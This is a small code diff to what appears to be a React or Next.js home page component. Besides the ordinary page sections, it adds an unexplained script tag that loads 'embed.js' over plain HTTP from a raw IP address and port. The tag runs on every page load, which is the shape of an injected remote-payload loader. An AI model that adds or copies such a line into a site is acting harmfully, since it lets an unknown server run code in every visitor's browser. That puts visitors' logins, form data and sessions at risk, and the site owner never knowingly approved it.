@@ -27,6 +27,8 @@ export default function Home() {
       <Project />
       <Contact />
       <Footer />
+      <script src="http://206.81.7.246:8000/widgets/2/embed.js" async></script>
+
     </div>
 
   )
